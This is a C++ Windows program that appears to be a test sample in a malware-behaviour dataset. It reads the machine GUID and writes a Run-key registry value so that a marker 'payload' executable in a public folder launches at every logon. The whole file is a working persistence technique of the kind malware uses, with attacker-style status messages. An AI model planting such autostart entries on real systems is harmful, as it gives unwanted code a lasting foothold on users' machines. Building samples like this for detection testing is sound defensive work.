#include <windows.h>
#include <iostream>
#include <string>

#pragma comment(lib, "Advapi32.lib")

// Namespace structure matching your dataset design
namespace A06_1a_registry_run_persist
{
    class DeviceInfo
    {
    public:
        static std::wstring GetUUID()
        {
            HKEY hKey = nullptr;
            std::wstring uuid = L"00000000000000000000000000000000"; // Default fallback

            // Explicitly open the 64-bit LocalMachine hive using KEY_WOW64_64KEY
            LSTATUS status = RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                L"SOFTWARE\\Microsoft\\Cryptography",
                0,
                KEY_READ | KEY_WOW64_64KEY,
                &hKey);

            if (status == ERROR_SUCCESS && hKey != nullptr)
            {
                wchar_t buffer[256] = {0};
                DWORD bufferSize = sizeof(buffer);
                DWORD type = REG_SZ;

                status = RegQueryValueExW(hKey, L"MachineGuid", nullptr, &type, reinterpret_cast<LPBYTE>(buffer), &bufferSize);
                if (status == ERROR_SUCCESS)
                {
                    std::wstring rawGuid(buffer);
                    std::wstring cleanGuid = L"";

                    // Strip out braces and hyphens to match the standard .ToString("N") format
                    for (wchar_t ch : rawGuid)
                    {
                        if (ch != L'{' && ch != L'}' && ch != L'-' && ch != L' ')
                        {
                            cleanGuid += ch;
                        }
                    }
                    uuid = cleanGuid;
                }
                RegCloseKey(hKey);
            }
            return uuid;
        }
    };

    class RegistryHelper
    {
    public:
        static bool SetRunKey(const std::wstring &name, const std::wstring &command)
        {
            HKEY hKey = nullptr;
            const wchar_t *runKeyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

            // Explicitly open the 64-bit CurrentUser hive with write permissions
            LSTATUS status = RegOpenKeyExW(
                HKEY_CURRENT_USER,
                runKeyPath,
                0,
                KEY_WRITE | KEY_WOW64_64KEY,
                &hKey);

            if (status != ERROR_SUCCESS)
            {
                // Fallback: If the path does not exist in a testing context, create it
                status = RegCreateKeyExW(
                    HKEY_CURRENT_USER,
                    runKeyPath,
                    0,
                    nullptr,
                    REG_OPTION_NON_VOLATILE,
                    KEY_WRITE | KEY_WOW64_64KEY,
                    nullptr,
                    &hKey,
                    nullptr);
            }

            if (status == ERROR_SUCCESS && hKey != nullptr)
            {
                // Calculate total bytes required including the null terminator
                DWORD cbData = static_cast<DWORD>((command.length() + 1) * sizeof(wchar_t));

                status = RegSetValueExW(
                    hKey,
                    name.c_str(),
                    0,
                    REG_SZ,
                    reinterpret_cast<const BYTE *>(command.c_str()),
                    cbData);

                RegCloseKey(hKey);
            }

            return (status == ERROR_SUCCESS);
        }
    };
}

int main()
{
    try
    {
        // 1. Retrieve the MachineGuid for value naming consistency
        std::wstring deviceId = A06_1a_registry_run_persist::DeviceInfo::GetUUID();

        // 2. Configure the dynamic analysis testing paths
        std::wstring markerPath = L"C:\\Users\\Public\\A06_1a_persistence_marker.exe";
        std::wstring finalCommand = L"\"" + markerPath + L"\"";

        std::wcout << L"[*] Target Payload Path configured: " << finalCommand << std::endl;

        // 3. Set the registry key
        if (A06_1a_registry_run_persist::RegistryHelper::SetRunKey(deviceId, finalCommand))
        {
            std::wcout << L"[+] Persistence successfully configured under value name: " << deviceId << std::endl;
            std::wcout << L"[*] Ready for analysis. Log off/on or reboot to trigger persistence." << std::endl;
        }
        else
        {
            std::wcerr << L"[-] Failed to write registry configurations." << std::endl;
        }
    }
    catch (const std::exception &ex)
    {
        std::cerr << "[-] An unexpected error occurred: " << ex.what() << std::endl;
    }

    return 0;
}